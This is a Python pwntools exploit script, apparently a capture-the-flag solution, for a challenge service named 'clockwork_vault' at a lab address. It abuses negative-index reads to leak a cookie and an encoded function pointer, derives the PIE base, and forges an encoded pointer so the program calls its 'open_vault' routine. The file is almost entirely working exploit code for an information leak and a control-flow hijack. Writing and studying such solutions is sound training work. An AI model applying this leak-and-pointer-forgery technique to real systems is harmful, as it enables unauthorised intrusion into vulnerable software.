#!/usr/bin/env python3
from pwn import *
import re


HOST = "10.112.0.12"
PORT = 42363

context.binary = elf = ELF("./clockwork_vault", checksec=False)
context.log_level = "INFO"

MAGIC = 0x43414C4942524154
REMOTE_OPEN_DELTA = 0x2B


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)


def menu_choice(io, choice):
    io.sendlineafter(b"> ", str(choice).encode())


def inspect(io, idx):
    menu_choice(io, 1)
    io.sendlineafter(b"Mechanism index:\n", str(idx).encode())
    io.recvline_contains(b"Name:")
    setting = int(re.search(rb"(0x[0-9a-fA-F]+)", io.recvline_contains(b"Setting:")).group(1), 16)
    encoded = int(re.search(rb"(0x[0-9a-fA-F]+)", io.recvline_contains(b"Encoded routine:")).group(1), 16)
    return setting, encoded


def retune(io, idx, setting, encoded):
    menu_choice(io, 2)
    io.sendlineafter(b"Mechanism index:\n", str(idx).encode())
    io.sendlineafter(b"New setting:\n", hex(setting).encode())
    io.sendlineafter(b"New encoded routine:\n", hex(encoded).encode())
    io.recvline_contains(b"Mechanism retuned.")


def run_cycle(io):
    menu_choice(io, 3)
    return io.recvall(timeout=1)


def solve(io):
    service_cookie, _ = inspect(io, -2)
    core_setting, core_encoded = inspect(io, -1)

    idle_addr = service_cookie ^ core_encoded
    pie_base = idle_addr - elf.sym.idle_cycle
    local_open_delta = elf.sym.open_vault - elf.sym.idle_cycle
    open_delta = REMOTE_OPEN_DELTA if args.REMOTE else local_open_delta
    open_vault_addr = idle_addr + open_delta
    open_vault_encoded = service_cookie ^ open_vault_addr

    log.info(f"service_cookie = {service_cookie:#x}")
    log.info(f"core_setting   = {core_setting:#x}")
    log.info(f"idle_addr      = {idle_addr:#x}")
    log.info(f"pie_base       = {pie_base:#x}")
    log.info(f"open_delta     = {open_delta:#x}")
    log.info(f"open_vault     = {open_vault_addr:#x}")

    retune(io, -1, MAGIC, open_vault_encoded)
    result = run_cycle(io)
    print(result.decode(errors="replace"), end="")


if __name__ == "__main__":
    io = start()
    solve(io)
